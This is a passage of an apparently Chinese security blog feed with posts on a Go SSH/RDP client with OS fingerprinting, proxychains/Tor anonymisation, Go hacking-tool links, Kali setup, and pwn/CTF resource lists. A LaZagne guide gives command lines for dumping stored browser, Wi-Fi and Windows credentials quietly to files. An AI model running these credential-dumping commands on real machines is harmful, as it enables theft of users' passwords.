&quot;</span>)</span><br><span class="line">  -w, --password string   <span class="keyword">if</span> use user &amp; password to login; the password is <span class="keyword">for</span> user. (default <span class="string">&quot; &quot;</span>)</span><br><span class="line">  -p, --port int          remote host port (default 22)</span><br><span class="line">  -u, --user string       remote host user (default <span class="string">&quot;root&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/help.jpg"></li>
</ul>
<h3 id="ssh-management"><a href="#ssh-management" class="headerlink" title="ssh management"></a>ssh management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s &lt;ip addr&gt; -p &lt;port&gt; -u &lt;username&gt; -w &lt;password&gt;</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">- &#123;your choice [1]&#125;</span><br><span class="line">[+] ssh <span class="built_in">command</span> result is:</span><br><span class="line">Linux yisu-5de4c53d34764 3.10.0-327.el7.x86_64 <span class="comment">#1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">[+] host and ssh port is: 110.42.1.217 22</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/ssh.jpg"></li>
</ul>
<h3 id="rdp-management"><a href="#rdp-management" class="headerlink" title="rdp management"></a>rdp management</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\hackingwithgolang\gordpssh&gt;gordpssh.exe -s 39.104.21.7 -p 3389 -u adminstrator -w 12345678</span><br><span class="line">...</span><br><span class="line">2</span><br><span class="line">- &#123;your choice [2]&#125;</span><br><span class="line">39.104.21.7:3389</span><br><span class="line">[DEBUG][x224 sendConnectionRequest 0ee000000000000100080003000000]</span><br><span class="line">[DEBUG][tpkt Write 030000130ee000000000000100080003000000]</span><br><span class="line">[DEBUG][GetBytes:  0300]</span><br><span class="line">[DEBUG][tpkt recvHeader 0300 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tptk recvHeader FASTPATH_ACTION_X224, <span class="built_in">wait</span> <span class="keyword">for</span> recvExtendedHeader]</span><br><span class="line">[DEBUG][GetBytes:  0013]</span><br><span class="line">[DEBUG][tpkt recvExtendedHeader 0013 &lt;nil&gt;]</span><br><span class="line">[DEBUG][tpkt <span class="built_in">wait</span> recvData]</span><br><span class="line">[DEBUG][GetBytes:  0ed00000123400020f080002000000]</span><br><span class="line">[DEBUG][tpkt recvData 0ed00000123400020f080002000000 &lt;nil&gt;]</span><br><span class="line">[DEBUG][x224 recvConnectionConfirm 0ed00000123400020f080002000000]</span><br><span class="line">[+] Os Fingerprint is: [0ed00000123400020f080002000000]</span><br><span class="line">[+] os version is 2012R2 OR 8</span><br><span class="line">[INFO][TYPE_RDP_NEG_RSP]</span><br><span class="line">[INFO][*** NLA Security selected ***]</span><br><span class="line">[INFO][StartNLA]</span><br><span class="line">[INFO][StartTLS]</span><br><span class="line">[DEBUG][recvChallenge 30820102a003020106a181fa3081f73081f4a081f10481ee4e544c4d53535000020000001e001e003800000035828a623c69b461abc3866d00000000000000009800980056000000060380250000000f69005a003000330064006f00720066006f006d0079003700340072005a0002001e0069005a003000330064006f00720066006f006d0079003700340072005a0001001e0069005a003000330064006f00720066006f006d0079003700340072005a0004001e0069005a003000330064006f00720066006f006d0079003700340072005a0003001e0069005a003000330064006f00720066006f006d0079003700340072005a0007000800d71b5d074800d60100000000]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gordpssh/master/pics/rdp.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量的ssh，rdp管理客户端</li>
<li>连接ssh端口并能使用-c执行linux命令</li>
<li>连接rdp端口</li>
<li>识别rdp端口所在主机的指纹判断主机操作系统类型</li>
<li>持续更新</li>
</ul>
<h3 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h3><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-proxychains-ssr翻墙</title>
    <url>/2019/02/13/kali-linux-proxychains-ssr/</url>
    <content><![CDATA[<p><font color="blue">上网泄露ip地址是一个非常严重的问题，不仅涉及自己的隐私被盗，造成一定的安全隐患，严重时，甚至可能会遭遇牢狱之灾。下面就来谈谈kali linux下的proxychain的使用。带来网络自由的快感。</font></p>
<p>首先执行下面的命令，打开没有修改proxychains代理前的浏览器，百度查看ip地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firefox www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains.jpg"></p>
<p><img src="/images/proxychains1.jpg"></p>
<a id="more"></a>

<p>可以看到ip地址还是本地的地址，下面来修改一下proxychains的配置文件，执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>按照下图所示的部分修改即可</p>
<p><img src="/images/proxychains2.jpg"></p>
<p><img src="/images/proxychains3.jpg"></p>
<p>然后ctrl+x保存退出即可</p>
<p><font color="red">注意，使用proxychains代理浏览器需要先搭建vps配置shadowsocksr代理，搭建和配置方法详见之前一篇的本人博客。</font></p>
<p>然后启动tor服务，tor具有匿名访问的功能，能够更好的保护隐私，防止DNS泄露</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service tor start</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains4.jpg"></p>
<p>接下来以proxychains代理的方式来启动浏览器打开<span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb23ovpPlhaVpcOadpeafpeeci2lw5Zyw5Z2ALw==">www.baidu.com输入ip来查看ip地址<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains5.jpg"></p>
<p><img src="/images/proxychains6.jpg"></p>
<p>再来试下打开谷歌</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox www.google.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/proxychains7.jpg"></p>
<p>完全没问题！</p>
<p>另外，如果不想敲命令的话，也可以按如下图所示配置浏览器，效果是一样的</p>
<p><img src="/images/proxychains8.jpg"></p>
]]></content>
      <categories>
        <category>kali配置</category>
      </categories>
      <tags>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>hack-with-golang-go-github-安全资源合集</title>
    <url>/2020/03/25/hack-with-golang/</url>
    <content><![CDATA[<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/coderain.gif"></li>
</ul>
<h3 id="批量ssh管理工具"><a href="#批量ssh管理工具" class="headerlink" title="批量ssh管理工具"></a>批量ssh管理工具</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9tdWx0aXNzaA==">multissh<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="Security-with-Go"><a href="#Security-with-Go" class="headerlink" title="Security-with-Go"></a>Security-with-Go</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9TZWN1cml0eS13aXRoLUdv">Security-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="lcx在golang下的实现-内网穿透-端口转发工具"><a href="#lcx在golang下的实现-内网穿透-端口转发工具" class="headerlink" title="lcx在golang下的实现(内网穿透-端口转发工具)"></a>lcx在golang下的实现(内网穿透-端口转发工具)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9OQVRCeXBhc3M=">NATBypass<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="onionscan-暗网扫描器"><a href="#onionscan-暗网扫描器" class="headerlink" title="onionscan(暗网扫描器)"></a>onionscan(暗网扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9vbmlvbnNjYW4=">onionscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化"><a href="#goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化" class="headerlink" title="goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)"></a>goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3NjYW4=">goscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Hacking-With-Golang-Golang安全资源合集"><a href="#Hacking-With-Golang-Golang安全资源合集" class="headerlink" title="Hacking-With-Golang(Golang安全资源合集)"></a>Hacking-With-Golang(Golang安全资源合集)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLVdpdGgtR29sYW5n">Hacking-With-Golang<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。"><a href="#gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。" class="headerlink" title="gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)"></a>gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2NyYWNr">gocrack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="x-crack-多协议弱口令扫描器"><a href="#x-crack-多协议弱口令扫描器" class="headerlink" title="x-crack(多协议弱口令扫描器)"></a>x-crack(多协议弱口令扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci94LWNyYWNr">x-crack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍"><a href="#Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍" class="headerlink" title="Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)"></a>Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLXdpdGgtR28=">Hacking-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码"><a href="#goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码" class="headerlink" title="goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)"></a>goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb0hhY2tUb29scw==">goHackTools<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h4><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
<li>Happy hacking!</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-linux-2019.4设置中文字体</title>
    <url>/2019/12/04/kali-screen-shot/</url>
    <content><![CDATA[<p>最近Kali linux更新到了2019.4版本，下载下来发现找不到设置中文的选项，经过在网上搜索一番发现一个开源的汉语字体包：文泉驿字体</p>
<p>在终端中输入以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br></pre></td></tr></table></figure>

<p>安装完成后，重启系统就会变成中文的系统啦</p>
<a id="more"></a>

<p>下边附上我更改为中文后的kali系统</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/kaliscreen.jpg"></p>
<p>下面再推荐一款kali下好用的截屏品工具:</p>
<p>kali 截图工具Scrot的安装及使用:</p>
<p>安装之前确认/etc/apt/sources.list源配好：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install scrot</span><br></pre></td></tr></table></figure>

<p>使用方式：</p>
<ul>
<li>1.截取整个桌面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot</span><br></pre></td></tr></table></figure>

<ul>
<li>2.指定保存目标文件夹和截图文件名(默认保存当前目录下)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot /root/Pictures/1.png</span><br></pre></td></tr></table></figure>

<ul>
<li>3.截取特定窗口或矩形区域</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scrot -s</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali配置</category>
      </categories>
      <tags>
        <tag>kali linux 2019.4</tag>
      </tags>
  </entry>
  <entry>
    <title>LaZagne---全平台多功能密码恢复工具</title>
    <url>/2019/12/03/password-stealer/</url>
    <content><![CDATA[<p>LaZagne项目是AlessandroZ大佬的，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=">github项目地址<i class="fa fa-external-link-alt"></i></span></p>
<p>LaZagne项目是一个开源应用程序，用于检索大量存储在本地计算机上的密码。 每个软件都使用不同的技术（纯文本，API，自定义算法，数据库等）存储其密码。 开发该工具的目的是为最常用的软件找到这些密码。</p>
<p>LaZagne共支持恢复chats,mails,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php等等14项密码，具体如下图所示。</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne1.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne2.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne3.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne4.jpg"></p>
<ul>
<li>启动所有模块</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all</span><br></pre></td></tr></table></figure>

<ul>
<li>仅启动特定模块</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers</span><br></pre></td></tr></table></figure>

<ul>
<li>仅启动特定的软件脚本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure>

<ul>
<li>将找到的所有密码写到文件中（对于普通txt，为-oN，对于Json为-oJ，对于所有为-oA）。 注意：如果您在解析以多行字符串形式编写的JSON结果时遇到问题，请选中此复选框。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers -firefoxlaZagne.exe all -oN</span><br><span class="line">laZagne.exe all -oA -output C:\Users\<span class="built_in">test</span>\Desktop</span><br></pre></td></tr></table></figure>

<ul>
<li>帮助</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe -h</span><br><span class="line">laZagne.exe browsers -h</span><br></pre></td></tr></table></figure>

<ul>
<li>更改详细输出模式(2个不同级别)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -vv</span><br></pre></td></tr></table></figure>

<ul>
<li>安静模式（标准输出上不会打印任何内容）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -quiet -oA</span><br></pre></td></tr></table></figure>

<ul>
<li>要解密域凭据，可以通过指定用户Windows密码来完成。 否则，它将尝试将所有已找到的密码作为Windows密码使用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -password ZapataVive</span><br></pre></td></tr></table></figure>

<p>注意：对于wifi密码\Windows Secrets，请以管理员权限启动它（UAC身份验证/sudo)</p>
<h3 id="Mac-OS"><a href="#Mac-OS" class="headerlink" title="Mac OS"></a>Mac OS</h3><p>注意：在Mac OS系统中，如果没有用户密码，则很难检索存储在计算机上的密码。 因此，我建议使用以下选项之一</p>
<ul>
<li>如果您知道用户密码，请在命令行中添加</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne all --password SuperSecurePassword</span><br></pre></td></tr></table></figure>

<ul>
<li>您可以使用交互式模式，该模式将向用户提示对话框，直到密码正确为止</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">laZagne all -i</span><br></pre></td></tr></table></figure>

<h3 id="Supported-software"><a href="#Supported-software" class="headerlink" title="Supported software"></a>Supported software</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne5.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne6.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/lazagne7.jpg"></p>
<h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>QQ:1185151867</p>
<p><font color="red">HAPPY HACKING!!!</font></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>password recover</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装proxychains-ng(proxychains升级版)</title>
    <url>/2019/10/23/proxychains-ng/</url>
    <content><![CDATA[<p><font color="blue">今天打开kali，启动v2ray，然后proxychains代理firefox打开google,忽然发现打不开了，命令行也显示找不到DNS，网上到处乱搜也解决不了问题，最后看到了proxychains-ng(proxychains的升级版)，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvZmwwci9wcm94eWNoYWlucy1uZw==">github下载地址<i class="fa fa-external-link-alt"></i></span>,下面是详细安装和使用过程。</font></p>
<h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>　　在linux系统中有很多软件是不支持代理的，但是proxychains 却可以让不支持代理的软件</p>
<p>　　也能走代理通道，支持HTTP，HTTPS,SOCKS4,SOCKS5,等多种代理协议，而且还能配置代理链</p>
<p>　　(可以理解成多重代理)，可以说是安全渗透的神器！</p>
<a id="more"></a>

<h3 id="强加密"><a href="#强加密" class="headerlink" title="强加密"></a>强加密</h3><p>　　“强加密”代理指的是使用的一重代理，二重代理，多重代理中有一个代理是“强加密”</p>
<p>　　类型的那么该代理就是“强加密”代理。这样如果别人想要获得你的真实IP是很困难的。</p>
<p>　　Tor就属于一种“强加密”代理，但是由于国内环境我们必须要进行前置代理，</p>
<p>　　所以我选择SSR+Tor的组合。</p>
<h3 id="socks4和socks5的区别"><a href="#socks4和socks5的区别" class="headerlink" title="socks4和socks5的区别"></a>socks4和socks5的区别</h3><p>SOCKS代理与其他类型的代理不同，它只是简单地传递数据包，而并不关心是何种应用协议，既可以是HTTP请求，</p>
<p>所以SOCKS代理服务器比其他类型的代理服务器速度要快得多。</p>
<p>SOCKS代理又分为SOCKS4和SOCKS5</p>
<p>二者不同的是SOCKS4代理只支持TCP协议（即传输控制协议），而SOCKS5代理则既支持TCP协议又支持UDP协议</p>
<p>（即用户数据包协议），还支持各种身份验证机制、服务器端域名解析等。SOCK4能做到的SOCKS5都可得到，</p>
<p>但SOCKS5能够做到的SOCK4则不一定能做到，比如我们常用的聊天工具QQ在使用代理时就要求用SOCKS5代理，</p>
<p>因为它需要使用UDP协议来传输数据</p>
<h4 id="第一步：卸载原来自带的proxychains"><a href="#第一步：卸载原来自带的proxychains" class="headerlink" title="第一步：卸载原来自带的proxychains"></a>第一步：卸载原来自带的proxychains</h4><p>命令行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get autoremove proxychains</span><br></pre></td></tr></table></figure>
<p>(autoremove这样能卸载干净)<br>然后删除proxychians.conf配置文件:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -v /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<h4 id="第二步：下载proxychains-ng，并安装"><a href="#第二步：下载proxychains-ng，并安装" class="headerlink" title="第二步：下载proxychains-ng，并安装"></a>第二步：下载proxychains-ng，并安装</h4><p>想要使用proxychains-ng首先需要在kali上配置好ssr或者v2ray的客户端，并部署和搭建好vps服务器，本人博客之前有一篇搭建ssr的文章，之后有空会写搭建v2ray的文章，文章地址<a href="https://fdlucifer.github.io/2019-02-06-ssr.html#more">国外的vps自建ssr,附带加速教程</a></p>
<p>下载和安装命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">make install-config</span><br></pre></td></tr></table></figure>
<p>leafpad命令打开/proxychains-ng/src目录下的proxychains.conf如下图所示编辑，并添加”sock5 127.0.0.1 1080”<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains1.jpg" alt="proxychains1"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains2.jpg" alt="proxychains2"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains3.jpg" alt="proxychains3"><br>然后将/proxychains-ng/src目录下的proxychains.conf文件复制到/etc目录下,就可以使用了。</p>
<h4 id="第三步：启用v2ray并使用proxychains-ng"><a href="#第三步：启用v2ray并使用proxychains-ng" class="headerlink" title="第三步：启用v2ray并使用proxychains-ng"></a>第三步：启用v2ray并使用proxychains-ng</h4><p>启动v2ray:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./v2ray</span><br></pre></td></tr></table></figure>
<p>然后使用proxychains4命令查看当前已经代理的ip地址:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 curl https://ip.cn</span><br></pre></td></tr></table></figure>
<p>如下图所示，已经成功使用vps的ip地址：<br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains4.jpg" alt="proxychains3"></p>
<p>使用proxychains命令启动firefox浏览器并打开google,youtube等网站，速度非常快</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 firefox google.com</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains5.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains6.jpg" alt="proxychains3"></p>
<p>使用proxychains来代理nmap,sqlmap,pip等等软件都是可以的，如下几图所示：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains7.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains8.jpg" alt="proxychains3"><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/proxychains9.jpg" alt="proxychains3"></p>
<h3 id="THANKS-FOR-WATCHING"><a href="#THANKS-FOR-WATCHING" class="headerlink" title="THANKS FOR WATCHING!"></a><font color="red"><strong><em>THANKS FOR WATCHING!</em></strong></font></h3>]]></content>
      <categories>
        <category>kali下的工具使用</category>
      </categories>
      <tags>
        <tag>proxychains</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn逆向资源以及各种poc收录</title>
    <url>/2020/02/13/pwn-resources/</url>
    <content><![CDATA[<ul>
<li><p>“pwn”（pwn）-表示要危害或控制，特别是另一台计算机（服务器或PC），网站，网关设备或应用程序。它与黑客或破解（包括iOS越狱）的定义同义。—维基百科</p>
</li>
<li><p>溢出攻击的本质在于冯·诺依曼计算机模型对数据和代码没有明确区分这一先天性缺陷。因为攻击者可以将代码放置于数据区段，转而让系统去执行。</p>
</li>
</ul>
<h3 id="shell-storm"><a href="#shell-storm" class="headerlink" title="shell-storm"></a>shell-storm</h3><p><span class="exturl" data-url="aHR0cDovL3NoZWxsLXN0b3JtLm9yZy8=">shell-storm<i class="fa fa-external-link-alt"></i></span></p>
<p>各类ctf的writeup和shellcode，以及cve漏洞公开，缓冲区溢出等等。。。</p>
<a id="more"></a>

<h3 id="linux-syscall-reference"><a href="#linux-syscall-reference" class="headerlink" title="linux syscall reference"></a>linux syscall reference</h3><p><span class="exturl" data-url="aHR0cDovL3N5c2NhbGxzLmtlcm5lbGdyb2suY29tLw==">linux syscall reference<i class="fa fa-external-link-alt"></i></span></p>
<p>linux syscal各类寄存器地址核对表</p>
<h3 id="Diary-of-a-reverse-engineer"><a href="#Diary-of-a-reverse-engineer" class="headerlink" title="Diary of a reverse-engineer"></a>Diary of a reverse-engineer</h3><p><span class="exturl" data-url="aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvLw==">Diary of a reverse-engineer<i class="fa fa-external-link-alt"></i></span></p>
<p>逆向大牛的手稿，其中包括各类逆向工程学，缓冲区溢出，cve等等知识。。。</p>
<h3 id="ctf-wiki"><a href="#ctf-wiki" class="headerlink" title="ctf wiki"></a>ctf wiki</h3><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kv">CTF Wiki<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="PWNABLE-TW"><a href="#PWNABLE-TW" class="headerlink" title="PWNABLE.TW"></a>PWNABLE.TW</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wd25hYmxlLnR3Lw==">PWNABLE.TW<i class="fa fa-external-link-alt"></i></span></p>
<p>Pwnable.tw是一个供黑客测试和扩展其二进制利用pwn技能的ctf游戏网站。</p>
<h3 id="gdb逆向调试工具"><a href="#gdb逆向调试工具" class="headerlink" title="gdb逆向调试工具"></a>gdb逆向调试工具</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bmRiZy9wd25kYmc=">pwndbg<i class="fa fa-external-link-alt"></i></span></p>
<p>pwndbg是一个GDB插件，它使使用GDB进行调试的工作量减少，重点放在低级软件开发人员，硬件黑客，逆向工程人员和漏洞利用开发人员所需的功能上。它具有许多功能，请参阅<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B3bmRiZy9wd25kYmcvYmxvYi9kZXYvRkVBVFVSRVMubWQ=">pwndbg FEATURES<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9Qd25nZGI=">Pwngdb<i class="fa fa-external-link-alt"></i></span></p>
<p>pwn专用gdb</p>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><p><span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3Iv">pwnable.kr<i class="fa fa-external-link-alt"></i></span></p>
<p>“pwnable.kr”是一个非商业性的ctf游戏网站，提供有关系统开发的各种pwn挑战。pwnable.kr的主要目的是“有趣”。请将每个挑战视为游戏。在玩pwnable.kr时，可以学习/提高系统黑客技能，但这不是唯一目的。</p>
<h3 id="ExploitBox"><a href="#ExploitBox" class="headerlink" title="ExploitBox"></a>ExploitBox</h3><p><span class="exturl" data-url="aHR0cHM6Ly9leHBsb2l0Ym94LmlvLw==">ExploitBox<i class="fa fa-external-link-alt"></i></span></p>
<p>ExploitBox是一个面向黑客，Bug猎人，研究人员和其他安全人员的游乐场和实验室。</p>
<h3 id="LEGAL-HACKERS"><a href="#LEGAL-HACKERS" class="headerlink" title="LEGAL HACKERS"></a>LEGAL HACKERS</h3><p><span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tLw==">LEGAL HACKERS<i class="fa fa-external-link-alt"></i></span></p>
<p>大神的一些漏洞poc，及其漏洞利用。。。</p>
<h3 id="将shellcode转换为汇编代码"><a href="#将shellcode转换为汇编代码" class="headerlink" title="将shellcode转换为汇编代码"></a>将shellcode转换为汇编代码</h3><p>参考<span class="exturl" data-url="aHR0cHM6Ly9odm50M3IudG9wLzIwMTgvMTAvU2hlbGwtY29kZSVFNyU5QSU4NCVFNyVCQyU5NiVFNSU4NiU5OSVFNSU5MiU4QyVFNSU4OCVBOSVFNyU5NCVBOC8=">Shell-code的编写和利用<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9ST1BnYWRnZXQ=">ROPgadget<i class="fa fa-external-link-alt"></i></span></p>
